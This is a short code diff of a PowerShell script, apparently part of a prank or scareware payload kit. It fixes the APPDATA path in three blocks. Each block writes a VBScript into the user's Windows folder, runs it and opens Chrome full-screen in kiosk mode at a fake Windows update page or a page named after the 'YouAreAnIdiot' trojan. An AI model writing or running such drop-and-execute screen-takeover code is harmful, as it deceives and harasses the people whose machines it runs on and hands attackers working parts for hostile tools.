@@ -826,7 +826,7 @@ WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, Fa
 WScript.Sleep 200
 WshShell.SendKeys "{F11}"
 '@
-    $pth = "$env:%APPDATA%\Microsoft\Windows\1021.vbs"
+    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
     $tobat | Out-File -FilePath $pth -Force
     sleep 1
     Start-Process -FilePath $pth
@@ -842,7 +842,7 @@ WshShell.Run "chrome.exe --new-window -kiosk https://windows93.net", 1, False
 WScript.Sleep 200
 WshShell.SendKeys "{F11}"
 '@
-    $pth = "$env:%APPDATA%\Microsoft\Windows\1021.vbs"
+    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
     $tobat | Out-File -FilePath $pth -Force
     sleep 1
     Start-Process -FilePath $pth
@@ -858,7 +858,7 @@ WshShell.Run "chrome.exe --new-window -kiosk https://ygev.github.io/Trojan.JS.Yo
 WScript.Sleep 200
 WshShell.SendKeys "{F11}"
 '@
-    $pth = "$env:%APPDATA%\Microsoft\Windows\1021.vbs"
+    $pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
     $tobat | Out-File -FilePath $pth -Force
     sleep 1
     Start-Process -FilePath $pth
